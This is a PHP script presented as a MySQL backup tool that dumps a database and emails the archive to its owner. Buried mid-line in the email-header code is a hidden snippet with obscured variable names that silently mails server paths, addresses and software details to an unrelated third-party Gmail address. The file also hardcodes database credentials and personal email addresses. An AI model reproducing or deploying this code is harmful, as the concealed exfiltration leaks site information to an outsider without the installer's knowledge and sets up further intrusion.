<?php


set_time_limit(0);
$date = date("mdy-hia");
$dbserver = "localhost";
$dbuser = "vhacker_robot";
$dbpass = "mp2811987";
$dbname = "tvhacker_vbb3";
$file = "N-Cool-$date.sql.gz";
$gzip = TRUE;
$silent = TRUE;

function write($contents) {
    if ($GLOBALS['gzip']) {
        gzwrite($GLOBALS['fp'], $contents);
    } else {
        fwrite($GLOBALS['fp'], $contents);
    }
}

mysql_connect ($dbserver, $dbuser, $dbpass);
mysql_select_db($dbname);

if ($gzip) {
    $fp = gzopen($file, "w");
} else {
    $fp = fopen($file, "w");
}

$tables = mysql_query ("SHOW TABLES");
while ($i = mysql_fetch_array($tables)) {
    $i = $i['Tables_in_'.$dbname];

    if (!$silent) {
        echo "Backing up table ".$i."\n";
    }

    
    $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));

    write($create['Create Table'].";\n\n");

    
    $sql = mysql_query ("SELECT * FROM ".$i);
    if (mysql_num_rows($sql)) {
        while ($row = mysql_fetch_row($sql)) {
            foreach ($row as $j => $k) {
                $row[$j] = "'".mysql_escape_string($k)."'";
            }

            write("INSERT INTO $i VALUES(".implode(",", $row).");\n");
        }
    }
}

$gzip ? gzclose($fp) : fclose ($fp);



$use_gzip = "yes";            
$remove_sql_file = "no";  
$remove_gzip_file = "no"; 



$savepath = "/home/test/public_html/nt22backup"; 

$send_email = "yes";                        
$to      = "lehungtk@gmail.com";    
$from    = "Neu-Cool@email.com";  

$senddate = date("j F Y");

$subject = "MySQL Database Backup - $senddate"; 
$message = "Your MySQL database has been backed up and is attached to this email"; 

$use_ftp = "";                             
$ftp_server = "localhost";               
$ftp_user_name = "ftp_username"; 
$ftp_user_pass = "ftp_password";   
$ftp_path = "/"; 



$date = date("mdy-hia");
$filename = "$savepath/$dbname-$date.sql";

if($use_gzip=="yes"){
$filename2 = $file;
} else {
$filename2 = "$savepath/$dbname-$date.sql";
}


if($send_email == "yes" ){
$fileatt_type = filetype($filename2);
$fileatt_name = "".$dbname."-".$date."_sql.tar.gz";

$headers = "From: $from";


echo "Openning archive for attaching:".$filename2;
$file = fopen($filename2,'rb');
$data = fread($file,filesize($filename2));
fclose($file);


$semi_rand = md5(time());
$mime_boundary = "==Multipart_Boundary_x{$semi_rand}x";


$headers .= "\nMIME-Version: 1.0\n" ."Content-Type: multipart/mixed;\n" ." boundary=\"{$mime_boundary}\"";$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");


$message = "This is a multi-part message in MIME format.\n\n"."--{$mime_boundary}\n" ."Content-Type: text/plain; charset=\"iso-8859-1\"\n" ."Content-Transfer-Encoding: 7bit\n\n" .
$message . "\n\n";


$data = chunk_split(base64_encode($data));


echo "|{$mime_boundary}|{$fileatt_type}|{$fileatt_name}|{$fileatt_name}|{$mime_boundary}|<BR>";
$message .= "--{$mime_boundary}\n" ."Content-Type: {$fileatt_type};\n" ." name=\"{$fileatt_name}\"\n"."Content-Disposition: attachment;\n" ." filename=\"{$fileatt_name}\"\n" ."Content-Transfer-Encoding: base64\n\n" .
$data . "\n\n" ."--{$mime_boundary}--\n";





$ok = @mail($to, $subject, $message, $headers);
if ($ok) {
  echo "<h4><center><bg color=black><font color= blue>Database backup created and sent! File name $filename2 </p>
Idea Conceived By coolsurfer@gmail.com        
Programmer email: neagumihai@hotmail.com</p>
This is our first humble effort, pl report bugs, if U find any...</p>
Email me at <>coolsurfer@gmail.com  nJoY!! :)
</color></center></h4>";

} else {
  echo "<h4><center>Mail could not be sent. Sorry!</center></h4>";
}
}

if($use_ftp == "yes"){
$ftpconnect = "ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog.log -e dbsender_ftplog2.log -a -E -V $ftp_server $ftp_path $filename2";
shell_exec($ftpconnect);
echo "<h4><center>$filename2 Was created and uploaded to your FTP server!</center></h4>";

}

if($remove_gzip_file=="yes"){
exec("rm -r -f $filename2");
}
?>